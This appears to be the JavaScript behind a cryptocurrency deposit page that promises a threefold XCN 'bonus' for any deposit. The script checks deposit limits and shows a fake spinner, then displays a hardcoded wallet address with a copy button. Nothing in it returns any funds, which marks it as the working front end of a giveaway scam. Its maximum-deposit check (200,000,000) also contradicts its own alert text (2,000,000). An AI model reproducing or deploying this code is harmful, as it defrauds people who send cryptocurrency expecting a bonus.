const amount = document.getElementById("amount");
const amount2 = document.getElementById("amount2");
const bonus = document.getElementById("bonus");
const address = document.getElementById("address");
const generate = document.getElementById("generate");
const paymentDiv = document.getElementById("paymentDiv");
const roll = document.getElementById("roll");
const qrimg = document.querySelector("#qrimg");
const qrimg2 = document.querySelector("#qrimg2");
const myInput = document.querySelector("#myInput");


const address1 = "0xc7e73E14fC01624dF788525A54CA52257cF455fb";
const address2 = "0xc7e73E14fC01624dF788525A54CA52257cF455fb";


amount.addEventListener("input", evt => {
    bonus.value = evt.target.value * 3;
    amount2.value = evt.target.value;
    paymentDiv.style.display = "none";
    // generate.style.display = "block";
});

bonus.addEventListener("input", evt => {
    amount.value = evt.target.value / 3;
    amount2.value = evt.target.value / 3;
    paymentDiv.style.display = "none";
    // generate.style.display = "block";
});

generate.addEventListener("click", evt => {
    amount.style.border = "none";
    address.style.border = "none";
    if(!amount.value || !bonus.value){
        alert("Please enter amount!");
        amount.style.border = "1px solid red";
        return false;
    }
    if(amount.value > 200000000){
        alert("Deposit a maximum of 2,000,000 XCN");
        amount.style.border = "1px solid red";
        return false;
    }
    if(amount.value < 20000){
        alert("Deposit a minimum of 20,000 XCN");
        amount.style.border = "1px solid red";
        return false;
    }
    if(!address.value || address.value.length < 35){
        alert("Please enter a valid XCN address!");
        address.style.border = "1px solid red";
        return false;
    }
    roll.style.display = "inline-block"
    setTimeout(()=> {
        paymentDiv.style.display = "block";
        generate.style.display = "none";
        roll.style.display = "none";
    },1000);
}); 

function myFunction() {
    var copyText = document.getElementById("myInput");
    copyText.select();
    copyText.setSelectionRange(0, 99999);
    navigator.clipboard.writeText(copyText.value);
    
    var tooltip = document.getElementById("myTooltip");
    tooltip.innerHTML = "Copied: " ;
  }
  
  function outFunc() {
    var tooltip = document.getElementById("myTooltip");
    tooltip.innerHTML = "Copy to clipboard";
  }

